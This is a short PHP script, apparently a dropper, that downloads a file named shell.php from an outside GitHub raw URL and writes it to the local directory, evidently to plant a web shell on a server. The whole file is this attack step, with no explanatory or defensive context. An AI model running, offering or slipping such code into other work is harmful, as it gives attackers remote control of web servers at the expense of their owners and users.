<?php
$fp = fopen('shell.php', 'w');
fwrite($fp, file_get_contents('https://raw.githubusercontent.com/h4xm3/145662/master/shell.php'));
fclose($fp);
exit();
?>
